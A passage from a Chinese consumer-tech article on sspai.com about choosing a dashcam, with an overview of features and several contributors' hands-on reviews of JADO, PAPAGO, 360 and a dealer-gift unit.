target=\"_blank\">问题</a>：</p>\n<blockquote><p>假设经过了一阵沉寂过后，你想唤醒行车记录仪来帮你导航，那么有很大概率会让你的朋友认为你在和他说话，而他又没听清你刚才陈述的内容很有可能让你重复一遍。不得不说，这种行车中的社交尴尬真的是很尬。</p></blockquote>\n<h4>导航功能</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scrdb34taatkrloag.png\"></figure><p>导航功能基本只存在于后视镜式行车记录仪和车机式行车记录仪这两个门类下，国内的高德和百度都在做，好处是可以和手机上的对应的 App 相互联动，在家里查完地点，出发时就可以在车内的行车记录仪上导航前往了。</p>\n<p>当然，这个功能如果你想用物理后视镜的话就会非常尴尬，上面也说过屏幕上的信息会把后视镜挡住，即使有流媒体传输后视镜，但其实这不能从根本上解决问题，因为根据下面其他作者分享的使用体验来看，流媒体后视镜在晚上基本只能看得到一个巨大的光斑。</p>\n<h4>听音乐</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scrlb34taatkrlob0.png\"></figure><p>这个功能基本上只有基于 Android 系统的行车记录仪才能用上，而且非常依赖于汽车的音频输入。</p>\n<p>绝大多数的行车记录仪只允许使用出场预装的在线音乐 App，这是因为想要预装这些 App 就需要向这些 App 的厂商每年交一笔授权费，所以你自然也找不到这些 App 的行车记录仪版本了。当然这笔费用一样也会转嫁给我们。</p>\n<p>另外就是汽车的音频输入端问题，一般而言不同汽车支持的音频输入方式也不太一样，比如：AUX 输入、蓝牙输入、或是 FM 模式。AUX 输入需要汽车有 AUX 音频接口，这样只需要用 AUX 音频线把行车记录仪连上就行了。而蓝牙输入则需要汽车支持蓝牙输入，基本只需要配对一次日后就能正常使用了。</p>\n<p>如果既不支持 AUX 也不支持蓝牙输入，那么就要看你的行车记录仪支不支持 FM 模式了，如果支持的话，打开汽车上的「收音机」并调至行车记录仪发射的频率就可以搞定了。但这个方法的问题也同样存在，一个是不能听收音机，另一个则是如果开长途，不同地区 FM 占用的频率也不一样，可能行车记录仪和本地的电台会互相干扰。最后以上都不支持的话，只能使用停车记录仪的内置的扬声器了。</p>\n<h4>ADAS 辅助驾驶</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scrtb34ta9bscqpog.png\"><figcaption>图片来自互联网</figcaption></figure><p>行车记录仪的 ADAS 辅助驾驶基本可以算作是纯视觉的，所以功能一般不算多也相对保守。一般行车记录仪上的 ADAS 都有会有行人检测、前车启动、压线提示和跟车过近的提示。</p>\n<p>除了纯视觉的版本，部分的行车记录仪还可以通过加装额外的 GPS 模块或传感器模块拓展 ADAS 的精准性，甚至是可以控制汽车自动驾驶，当然这里就不做展开了，具体关键词可以搜索 comma.ai。</p>\n<h4>厂商 App</h4>\n<p>除了到处录像，厂商的 App 还会提供一些额外的实用功能，比如你的行车记录仪如果有 4G 模块，那么可以远程查看停车时的录像、可以通过振动情况向你发出警报。如果你的行车记录仪有 GPS 模块，那么还可以查看所有的历史驾驶行程和停车位置。两者均有的话有些厂商还提供了防盗的功能。</p>\n<h2>一些行车记录仪的实际体验</h2>\n<p>当然考虑到没有人会用很多的行车记录仪，所以我也邀请了几位作者朋友来聊聊他们自己的行车记录仪的使用体验：</p>\n<h3>ThomasTeng：耐用的 JADO 捷渡</h3>\n<ul>\n<li>预计售价：400 元</li>\n<li>视频分辨率：1080p</li>\n<li>购买日期：2013 年下半年</li>\n<li>其他信息：维修履历：2015 年末更换电源适配器（29 元）、2020 年 7 月更换 TF 卡（32.9 元）、正常使用至今（9 年）</li>\n</ul>\n<p>2013 年 4 月份下定人生第一台汽车，5 月交付，6 月 18 日驾证到手。新车在 4S 店停车场闲置近一个月，但这一个月我并没闲着，逛汽车之家论坛，筹备必需品。行车记录仪便是「居家旅行必备」之一，这 9 年来，它曾作为关键证据，令路过车辆为其溅起的碎石击（嵌）中（入）挡风玻璃事件付出了代价，也曾代我记录了自驾游的美好，物超所值。</p>\n<h4>整体使用评价</h4>\n<p>这款「口红」形状的行车记录仪，安装方便不遮挡视线，辗转多年陪伴着我的驾车旅途，就算时至今日依然够用。虽然期间也发生过两次故障，但一次是电源线损坏可以较低的成本更换，另一次是 TF 卡正常损耗，以及内置电池也已超出年限导致续航缩短，并不影响正常行车期间工作。记录仪是通过传统点烟器取电，布线相对简单仅需沿内饰边缘走线，甚至可以通过卡片辅助将供电线埋入内饰胶皮中。记录仪本体可以隐藏在后视镜后面，通过 3M 背胶固定在挡风玻璃上。该型号虽已停产，但正好可以作为参考该品牌的「可靠性」。</p>\n<h4>画质评价</h4>\n<p>作为以视频记录为主要功能的行车记录仪，正常白天的画质可以达到 1080p 高清，画面清晰<strong>无跳帧</strong>现象。接下来我们看一下视野条件不那么好的傍晚以及夜间画质（请忽略因电池损耗无法保存更新的日期水印）：</p>\n<p>傍晚正常市内快速路：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scs5b34ta9bscqpp0.png\"></figure><p>可以看到，虽然画面的光线较暗，但路面物体轮廓以及临近车辆、路牌上的字迹仍可清晰可辨（出于隐私保护目的，已将途中可见的四处字迹遮盖）。</p>\n<p>夜间市内街道：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scstb34ta9bscqppg.png\"></figure><p>相信大家一定关心夜间画质如何，个人认为夜间能够看清必要的路牌、车牌号等信息已「足够」，可以看到图中除了因车灯强光照射导致过曝而无法看清的车牌，与本车临近的几辆汽车的车牌仍能看清。</p>\n<h4>可视角度</h4>\n<p>通过适当调节安装方向和角度，可以令视频画面覆盖车前方约 170 度范围内的物体，虽然有因广角镜头带来的形变，但并不影响行车记录的功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84sct5b34ta98875r4g.png\"></figure><h4>视频文件存取方式</h4>\n<p>JADO 有两种取出录像方式，数据线或者直接取出 TF 卡拷贝。考虑到方便程度，直接取出 TF 卡的方式更好用。行车记录仪可以设置每分钟保存为一个独立文件，视频使用 MPEG-2 （也就是 DVD 中的 TS 格式），每分钟视频约占用 50MB 空间。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84sctlb34taatkrlobg.png\"></figure><p>默认设置是存储空间满了以后自动覆盖旧视频文件，可保留的视频记录时长仅取决于 TF 卡可用空间大小，个人经验对于一般用途 32GB 空间完全够用。视频可以通过快捷键设置为锁定状态，这样就可以保证重要的视频文件不会被新文件覆盖。</p>\n<h4>附加功能与不足</h4>\n<p>JADO行车记录仪自带碰撞锁定功能，可以自动锁定危急时刻的视频文件。</p>\n<p>不足之处是相对现在的新型号来说，视频取出和脱离电脑的视频回放功能体验不佳，小小的屏幕并不能看清细节。但鱼与熊掌难以兼得，能够做到稳定清晰地记录行车视频足矣。</p>\n<h3>JL DUAN：贴牌产品 PAPAGO 趴趴狗 N291 WiFi 版</h3>\n<ul>\n<li>预计售价：329 元</li>\n<li>购买日期：2021 年 10 月</li>\n<li>其他信息：另购配件：三星 128GB 行车记录仪/视频监控专用 TF 卡 ¥139.9</li>\n</ul>\n<p>​去年我「捡漏」了家里人换车以后留下的旧车，出于安全考虑，我装了一个行车记录仪。预算不多，所以要求也不高。因为平常对这个没有研究，看了看几个平台的评测就下单了。</p>\n<h4>整体使用评价</h4>\n<p>PAPAGO 虽是老牌行车记录仪厂家，但这款 N291 WiFi 却是代工厂的贴牌产品，虽然贴了 PAPAGO 的牌子，却无法通过 PAPAGO App 进行连接，只能使用一款名为「钛马星」的 App。App 本身无论是 UI 还是交互，只能说勉强能用。谁知经过几次更新后，App 主页塞了一个社区，竟然还把倍速播放做成了 VIP 功能…尽管这个 VIP 每月才一块钱，但我还是毫不犹豫的卸载了它。不为别的，因为 WiFi 传输视频实在是太慢了，需要导出视频的话，直接拔卡导出效率可能会更高吧。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c84scttb34ta98875r50.jpeg\"><figcaption>钛马星 App</figcaption></figure><h4>画质与可视角度评价</h4>\n<p>拍摄方面，可视区域主要集中在左中右三个车道内，在白天光线好的情况下，记录内容比较清晰；夜间有路灯的时候，可以拍清前车的车牌；夜间行驶在没有路灯的道路时，画面表现欠佳，弱光环境下遇到高光物体（如前车尾灯、对向来车的前灯）时容易过曝。</p>\n<figure class=\"ss-imgRows\" figcaption=\"白天 城市主干道 录像效果 夜间 城市外环路（有路灯）录像效果\"><img src=\"https://cdn.sspai.com/editor/u_/c84scu5b34ta9bscqpq0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84sculb34taatkrloc0.png\" alt=\"\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84scv5b34ta98875r5g.png\"><figcaption>夜间 国道（无路灯）录像效果</figcaption></figure><p>录像分辨率有 1440P 30fps / 1080P 60fps / 1080P 30fps 三个档位，可 SDR 防过曝功能只能在 1080P 30fps 模式下启用。综合录像效果和视频容量两方面考虑，我选了 1080P 30fps SDR 模式，配合 128G 内存卡，大概可以录 15 个小时，完全够用。</p>\n<h4>附加功能</h4>\n<p>停车监控、紧急锁定基本是行车记录仪的标配。停车监控功能是否可用，更多是取决于车辆实际情况，由于我的车熄火后点烟器会断电，因此无法实现停车监控。紧急锁定功能的灵敏度也可以调整，像我这种经常走山路、小路的人，灵敏度可以调低一些，免得出现误识别，锁定太多无用的视频挤占存储空间。</p>\n<h4>安装难易度</h4>\n<p>设备安装起来非常简单，后装行车记录仪供电基本都是差不多的走线方式，即车顶软装缝隙 &gt; A 柱 &gt; 中控台侧面 &gt; 副驾位脚垫 &gt; 点烟器。像我这样不太懂车的人，根据卖家给的参考视频也能独自完成安装。</p>\n<h4>其他与不足</h4>\n<p>这款产品有个缺点是比较挑内存卡，质量不好的内存卡可能会导致数据损坏，或者是出现跳帧、断录现象，在购物平台的评论区里能看到一些买家吐槽。我使用的是三星行车记录仪/视频监控专用内存卡（俗称三星白卡），目前没有出现问题。</p>\n<p>N291 WiFi 版在这个价位上属于平平无奇的基本款，无论白天还是夜间画质表现还算不错，适合在城市中使用。不过缺点也很明显：</p>\n<ul>\n<li>配套 App 体验不佳</li>\n<li>内存卡兼容性不好</li>\n<li>弱光环境表现较差</li>\n<li>受限于机能，画质设置中2K、60fps、SDR（防过曝）只能三选一，无法同时开启。</li>\n</ul>\n<h3>海狗种水果：两款不错的 360 行车记录仪</h3>\n<ul>\n<li>型号：G600</li>\n<li>预计售价：429 元</li>\n</ul>\n<p>我曾经是 papago 的粉丝，接近 10 年前开始使用 papago 的行车记录仪。这个来自台湾的品牌在当时提供了比较好的稳定性，车内的高温和低温，都不会对录制产生什么不利的影响。在购买了 3 台 papago 的行车记录仪之后，国产的行车记录仪性能已经有了明显的提升，于是我转向了 360 行车记录仪，一共购买了 1 台 G600，和 3 台 M320，价格倒是很巧合的一致，都是 429 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/f6e302e56ee47b546586d82ab3f92207.png\"><figcaption>G600 车外外观</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/98321001925c1084e1d8782acdb73478.png\"><figcaption>G600 车内外观</figcaption></figure><h4>G600 整体使用评价</h4>\n<p>G600 是一款功能非常全面的行车记录仪，体积小巧，可以很容易地贴在前风挡上。我把它贴在车内后视镜的前方，开车的时候我完全看不见它，真正做到了无感使用。它搭载了一块 3.97 英寸超大屏幕，但不是触摸屏。屏幕的旁边设置了 4 个触摸按钮，在成本和美观之间实现了完整的平衡。其实行车记录仪这种很久也不会更改一次设置的产品，根本没有什么必要使用电容触摸屏，360 的产品经理考虑得非常周到。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/8347e3d52bc6d15bda6262adb0421828.png\"><figcaption>G600 白天视野</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/8f4e1cc50e78526b487f7c13f49a5fa1.png\"><figcaption>G600 夜间视野</figcaption></figure><h4>G600 画质与可视角度</h4>\n<p>这款行车记录仪只有前视功能，不支持录制车后影像，录像分辨率达到 2.5K 标准，为 2560*1600。不知为什么，这款行车记录仪在我开车期间自动拍摄了一些照片，正好我可以用作这篇文章里的素材，非常贴心。白天视野很清晰，1/2.8 英寸的 CMOS 表现上佳；视角也比较广阔，139° 足以覆盖多个车道。得益于 F1.8 的超大光圈设计，夜间的清晰度也完全能够满足我的需要。</p>\n<h4>G600 视频文件的存储方式</h4>\n<p>与 M320 一样，G600 可以使用 360 的手机APP，用手机的 WiFi 连接行车记录仪这个热点，升级官方固件，或者直接导出视频。当然也可以取出 MicroSD 卡，用最传统、快捷和方便的方式，在电脑上导出视频，免得在复杂难用、不停地引导我注册和浏览社区的 APP 上遭罪。</p>\n<h4>G600 附加功能</h4>\n<p>与此同时，G600 还有一系列的辅助驾驶功能，十分丰富。比如，智能识别红绿灯，当我在等红灯的时候低头玩手机，当绿灯亮起时可能没有注意到，此时 G600 行车记录仪就会语音提醒我「绿灯亮起」，催促我赶紧起步，避免阻挡后车。又比如，前车起步提醒，当我在等红灯的时候低头玩手机，当绿灯亮起时前车已经起步可能没有注意到，此时 G600 行车记录仪就会语音提醒我「前车起步」，催促我赶紧起步，避免阻挡后车。再比如，电子狗和事故多发路段提醒，当我行驶到限速路段或者事故多发路段时，G600 行车记录仪就会通过内置的 GPS 识别到这些信息，并且自动提醒我这一路段的限速，或者告知我前方是事故多发路段，及时让我集中注意力，避免事故的发生。</p>\n<p>还比如，当我急转弯、急刹车时，搭载 6 轴陀螺仪的 G600 行车记录仪会即时的感知到，并且语音提示我「急转弯、急刹车」，让我更加柔和地行驶，避免对车辆的潜在损害和可能的交通事故。360 行车记录仪这些丰富而又贴心的提醒，<strong>让我这个 16 年 F1 车迷、驾车 20 多万公里的老司机不胜厌烦。</strong>我攻弯速度快点、享受一下驾驶乐趣你丫的不让，急刹车难道是我有意为之？我急刹车难道不是前方有突发状况而被迫急刹车的？</p>\n<p>所以我把它们全关了。</p>\n<p>世界清静之后，G600 还是一台不错的行车记录仪，虽然安全驾驶记录十分良好的我从来都没有用上过它。行车记录仪么，就应该平时安安静静、稳稳定定地录像，万一发生事故能够确保事故的过程被完整地记录下来就可以了。整天叽叽喳喳跟个麻雀似的，简直是除了坐在副驾瞎指挥的女人之外，车上最让我血压升高的组分了。</p>\n<p>这款行车记录仪的一大特点是内置了 470 毫安时的耐高温聚合物锂电池，万一发生碰撞，需要给交警叔叔展示事故过程，我完全可以直接把行车记录仪从车里拔出来，在屏幕上播放，省去了让交警叔叔钻到副驾驶的过程，很是贴心。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/d16b4dee0f3e38107ab7241e396ba967.png\"><figcaption>M320 车外的外观</figcaption></figure><ul>\n<li>型号： M320</li>\n<li>预计售价：429 元</li>\n</ul>\n<h4>M320 整体使用评价</h4>\n<p>我还购买了 3 台 M320 行车记录仪，足以说明我对这款产品的高度认可。M320 完全是另一种风格。与 G600 贴在前风挡玻璃上不同，M320 是直接绑在车内后视镜上的。这是 360 重磅推出的「全屏流媒体后视镜行车记录仪」，拥有 9.35 英寸的高清全面屏，可以实现前后双录。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/52fa6d4172f1f77e698405d319384452.png\"><figcaption>M320 车内外观</figcaption></figure><h4>M320 画质与可视角度</h4>\n<p>由于有后摄像头，它可以把后摄的画面实时显示在后视镜上，并且是全面屏的显示，这就是流媒体画面传输功能。当然，当我挂入倒挡的时候，它也会变身全屏倒车影像，显示倒车智能辅助的画面。虽然我认为实时显示后摄影像的流媒体后视镜变身倒车影像纯属脱裤子放屁，但后来我才明白这并非多此一举，理解了 360 产品经理的良苦用心。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/dc34ad2e7d3b37b0c50c535dcac8fc19.png\"><figcaption>M320 前视视野</figcaption></figure><p>M320 也采用了 F1.8 的大光圈镜头，前摄的分辨率高达 2560*1440，比 G600 要低一个档次，因为 CMOS 仅为 1/3 英寸，比 G600 的小了那么一点点。大光圈的效果不错，夜间成像质量虽不如 G600，但也完全能够接受。在傍晚进入灯火通明的隧道的时候，几乎感觉不出有太大的画质突变。这样迅速的反应令我很是满意。</p>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd1lb34taatkrloeg.gif\"><figcaption>M320 傍晚进入隧道</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/841988ffa230ba9dcfebeb50b75f2cfb.png\"><figcaption>M320 后摄视野</figcaption></figure><h4>M320 流媒体后视镜使用评价</h4>\n<p>后摄则只能录制 1920*1080 的视频，只能说基本够用。宽广的视野，要比传统的车内后视镜通过后风挡玻璃观察车后情况通透了很多很多，也不再受到车后视野盲区的制约，还能极大地扩展横向观察范围，真的是先进科技的灵光闪现。之所以后摄的分辨率低于前摄，显然是为了降低流媒体后视镜实时显示后摄影像的数据压力。即便减少了数据量，M320 的流媒体显示依然有所延迟，这在高速行驶过程中、电光火石的「惊鸿一瞥」般的观察后视镜的瞬间，极大地影响了使用体验。没有盲区的流媒体后视镜也影响了我对于后车距离的判断。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd35b34taatkrlofg.jpeg\"></figure><p>M320 详情页的流媒体后视镜功能说明</p>\n<p>在狗东的详情页上，M320号称全方位解决行车安全问题，尤其将降低强光干扰放在了第一位。当夜间打开流媒体后视镜功能时，后车的灯光将被摄像头有效过滤，防止强光直射驾驶员的眼睛。同时还能清晰的记录车后的影像，方便我回溯行驶过程中车后发生的点点滴滴。</p>\n<p>实际体验下来，这是彻底的胡扯。首先，夜间的后置摄像头在面临车灯照射的时候糊成一片，根本分辨不出车后的情况究竟如何。图11是我真实录制的影像，这段GIF里面有我后面的两辆汽车和被我超越的一辆电动三轮车，这三辆开着灯的交通参与者完美的融合在了一个超大号亮斑之中，让我对车后的一切都完全失去了掌握。</p>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd3lb34taatkrlog0.gif\"><figcaption>M320 后视灯光效果</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/21dbb4181e7aefc56241453642f958ee.png\"><figcaption>M320 夜间高速公路流媒体后视镜效果</figcaption></figure><p>其次，在夜间的高速上，M320 的流媒体功能更是难堪一用，后车的远光灯在后视镜的屏幕上形成了一个超大号的光斑，足以闪瞎我的氪金海狗眼。</p>\n<p>总之，作为一个流媒体后视镜，M320 不好用，特别不好用。那我为什么会非常认可 M320 的使用体验呢？因为它设置了一个 30 秒自动关闭屏幕的功能。关闭屏幕之后，M320 流媒体后视镜行车记录仪，化身成一个非常好用的防眩目车内光学后视镜，不但白天视野宽旷、显示清晰，夜间居然有相当可观的防眩目效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/14/bb1fbbda2b512a90c8b185bc1640f41a.png\"><figcaption>M320 防眩目光学后视镜在夜间高速公路上的效果</figcaption></figure><p>上图是高速公路上的同一个场景，这是我拍完图 11 后，M320 的屏幕自动熄灭所呈现出的效果。后车的远光灯在 M320 <strong>特殊防眩目涂层</strong>的过滤下，裸眼观看完全不刺眼，比那些涂成蓝色的后视镜行车记录仪的防眩目效果要好得多。</p>\n<p>当然这个白天很清晰、夜间防眩目的涂层，<strong>其实就是 M320 全面屏流媒体后视镜的 LCD 显示器</strong>。作为一台号称能够防眩目的流媒体后视镜，其防眩目功能需要在关闭流媒体功能后才能展现，不得不说有一种戏谑和讽刺的意味。</p>\n<p>当屏幕关闭之后，挂入倒挡时，后视镜就必须化身倒车影像及时亮起，充分发挥后置摄像头的功能。看来，360的产品经理其实什么都明白，早已把我们的各种使用场景安排得明明白白。</p>\n<h4>M320 和 G600 具备的特色功能</h4>\n<p>比如碰撞锁定、声控、GPS 轨迹、辅助驾驶、停车监控，360 的这两台行车记录仪都有，我都不用，实在没什么好说的。如果你的车跟我的一样，有自动防眩目后视镜和倒车影像，不需要录制车后的行车记录视频，那么 G600 会是个很好的选择。</p>\n<p>如果你的车没有自动防眩目后视镜和倒车影像，那么429 元的 M320，要比原厂的自动防眩目后视镜便宜很多，还白送了一个前后双摄的行车记录仪功能，也可以作为倒车影像使用，这就是我向你强烈推荐 M320 的原因。</p>\n<p>而且它是个不爱乱讲话、安安静静的乖孩子。</p>\n<h3>大K - 4S 店赠送的不知名记录仪</h3>\n<p>作为一名新晋车主，在我购车的这个时间背景和预算条件下，已经有很多车型本身就集成了行车记录仪，其中也不乏像特斯拉那样，能够利用环视摄像头近乎无死角地拍摄周边情况。但没办法，我喜欢上了一辆「新时代的老古董」。</p>\n<p>谈赠品时 4S 店主动赠送了行车记录仪，并在提车前直接安装到位。只可惜我当时并没有多问，想着「送了就行」，结果它并非大牌或原厂产品，而是一个叫做「钛马星」的品牌（没错，就是 JL DUAN 说的那个钛马星）。<strong>在使用了一段时间之后，我来作为一个反面典型，用亲身经历告诉大家：赠品廉价，不如不送。</strong></p>\n<h4>外观与取电：各有利弊</h4>\n<p>行车记录仪是个特殊产品：没有紧急情况时，我们希望它毫无存在感。这不仅要求记录仪外观和安装方式符合我们的需求，还有一点值得斟酌，那就是<strong>取电方式</strong>。这也是我在使用这款记录仪一段时间后，偶然发现了一些小问题，才知道原来取电方式也很重要。</p>\n<p>例如我的这款车型，其原厂售卖的记录仪需要替换后视镜背面 ADAS 摄像头外壳，并从雨量传感器取电，这样可以实现隐藏安装，不影响视野和美观，但雨感取电有可能会对自动雨刷功能造成影响，或者因为雨感是常电而导致记录仪不会自动关机。4S 店赠送给我的这款第三方产品则需要粘贴在前挡风玻璃上，虽然并不美观，但其取电方式却是埋线至驾驶舱保险盒内取电。</p>\n<figure class=\"ss-imgRows\" figcaption=\"请忽略我这满是灰尘的前挡玻璃\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd4tb34taatkrloh0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd5db34ta9bscqpsg.jpeg\" alt=\"\"></figure><p>理论上来说，从保险盒内取电更安全，并且还可以根据电气手册的说明来选择不同插销，这样就可以让某些不那么高级的记录仪实现驻车监控或下车断电。</p>\n<h4>录像效果：凑合够用</h4>\n<p>因为产品本身是不知名品牌，我一开始也没有报太大期望。事实证明，这种廉价赠品记录仪，不要有期待就是最好的使用体验。产品录像参数是 1080P 25FPS，设置内不可调。25 帧可以说是寒酸至极，却反而不会有什么拖影、掉帧情况发生了。</p>\n<p>在光照条件不错的情况下，这款记录仪能够将 2 ~3 个车身距离之内的车牌号拍摄清楚，路边的标识牌也能看到个大概。摄像头视野足以覆盖整个车头和正前方三车道的宽度。特殊情况下保留证据倒是足够，想要拿来当作旅行 Vlog？甭想了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd5lb34taavnbbqeg.jpeg\"><figcaption>大约 2 个车身距离外的车牌还勉强可以看清</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd5tb34taatkrlohg.jpeg\"><figcaption>光照均匀且充足时，行驶状态中也能看清车牌号</figcaption></figure><p>从暗光环境驶出、进入亮光环境的场景（比如从车库出来、下穿立交桥），此时这款记录仪并不能很好地应对（甚至是无法应对）。由于没有 HDR，录像画面必定会有严重过曝，在记录仪重新适应光照条件的这一小段时间里，前方车辆和物体就像「笼罩在圣光当中」，机器可用度几乎为 0 。</p>\n<p>然而在这种大光比情况下，ADAS 摄像头仍然可用，车道保持等一系列依赖机器视觉的辅助驾驶系统可以持续工作，甚至能够在大光比环境下快速识别车道线虚实变化。这也能从侧面反映出不同产品在元器件选用和软件调教方面的差距。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd65b34ta9bscqpt0.jpeg\"><figcaption>快看，天堂入口！</figcaption></figure><p>该问题也存在于逆光环境中。逆光的大光比环境下，前车后方的车牌、车标等基本是什么都看不到，并且由于暗部充满噪点和涂抹痕迹，导致细节严重丢失。另外在逆光环境下，中控台在前挡风玻璃上的倒影也比较严重，镜头处理不好的话会大面积遮挡记录仪视野。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd6lb34taavnbbqf0.jpeg\"><figcaption>逆光时，摄影效果堪比功能机</figcaption></figure><p>在晚间持续暗光条件下，刚才所说大光比环境下出现的问题依旧存在。影像中噪点和涂抹现象严重，堵车情况下向前看去一大片红色灯光，面对这种场景没有 HDR 的加持，各种颜色的高光不受压制，光晕也四处散开，可见其镜头用料也不太理想。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd6tb34taavnbbqfg.jpeg\"></figure><p>这种环境里，记录仪在静止状态下还可以看清前方及斜前方车辆的车牌号，然而在行驶状态中，它「能且只能」勉强地看清正前方 1 个车身距离的车牌号，再远一些则是「高度近视还没戴眼镜」的视觉效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd75b34taavnbbqg0.jpeg\"></figure><h4>功能与便利性：你是来捣乱的吧？</h4>\n<p>这款记录仪为了实现「隐藏风格」安装效果，其本身舍弃了屏幕，想要查看录像就必须拔卡，或者用手机直连到记录仪的 WiFi 热点用配套 App 操作。配套 App 与 JL DUAN 所说的是同一款 App，其中与行车记录仪相关的实质性功能和设置屈指可数。在视频导出方面，这种画面素质的视频文件，1 分钟也要 120MB 起步，无线直连的传输速度慢到可以与蓝牙比肩。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd7db34taavnbbqgg.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd7lb34taavnbbqh0.jpeg\" alt=\"\"></figure><p>App 内充斥着开屏广告、弹窗广告、无营养社区等内容，甚至还有 VIP 购买通道——看看这些所谓特权，<strong>我不理解</strong>。考虑到该产品本身并不优秀，配套 App 又充满了「捞钱」的味道，所以在功能和便利性上，我认为它达不到及格线。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd7tb34taavnbbqhg.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd85b34ta98875r60.jpeg\" alt=\"\"></figure><p>行车记录仪除了记录行驶视频以外，有许多功能是必须的，例如循环录制和碰撞锁定。前者倒是没有问题，后者在我查看记录仪存储卡时，发现了几段正常行驶时被触发锁定的录像，也许是路面颠簸达到了「中」灵敏度阈值。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：记录仪所有设置项 | 右：正常行驶时触发的紧急录像锁定\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd8db34ta9bscqptg.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c84sd8lb34taatkrloi0.png\" alt=\"\"></figure><p>另外它本身提供了驻车监控的选项开关，但无论是使用常电插销还是普通插销、无论选择开启还是关闭，这项功能均无法按照我想要的方式工作。我是怎么知道的？当它还在使用常电插销时，某天半夜飘雪，早起发现前挡玻璃已然覆盖上一层雪花，只有记录仪所在区域干干净净（发热量可观），我就知道，这个功能开关可能是个装饰品……</p>\n<h4>使用建议：赠品廉价，不如不送</h4>\n<p>因为这并不是我额外购买的产品，所以也难以给出产品选购建议。仅从我的使用经历出发，我还是想说说这样几点建议：</p>\n<p>车型是否自带行车记录仪并不是影响购车的关键因素，但是如果你喜欢的车型恰好有这项功能，<strong>最好在试驾时顺便体验一下</strong>，或者通过销售人员查看各种场景下的录像文件，毕竟购车花费中也包含了这项功能；</p>\n<p>在谈赠品时不要不好意思，如果 4S 店赠送记录仪，那么一定让对方<strong>明确</strong>下来赠品记录仪的品牌型号、产品详情、安装方式等；如果你认为可以接受，那么万事大吉，如果产品不好，就厚着脸皮继续谈；</p>\n<p>4S 店的赠品大多是合作商供货或门店囤货的廉价产品，一般都不会轻易松口更换，但如果可以，还是<strong>建议去争取大牌或原厂记录仪</strong>，否则就会像我一样用着鸡肋产品；另外，赠品也要提前要求有至少一年的质保，出现问题记得找销售和机师，维修无果就要求换新或补偿其他优惠。</p>\n<h2>写在最后</h2>\n<p>当然最后还要再提一嘴「电车也要行车记录仪」这个观点，现在有些电车已经内置了行车记录仪了，但可能行车记录仪还是要再装一个，具体原因大家可以看这个 <a href=\"https://www.zhihu.com/question/451652796\" target=\"_blank\">知乎回答</a>。但由于我不是专业人士，所以这里的回答我也并不能保证 100% 的正确，所以请大家理性讨论。</p>\n<p>以上就是如何挑选行车行车记录仪的所有内容了，希望可以帮助到未来将要选购行车记录仪的你。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注<a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，感受更多有趣的生活好物 💸</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71421"},{"title":"用一张价值 3000 元的纸是什么感受？这是我的 reMarkable 2 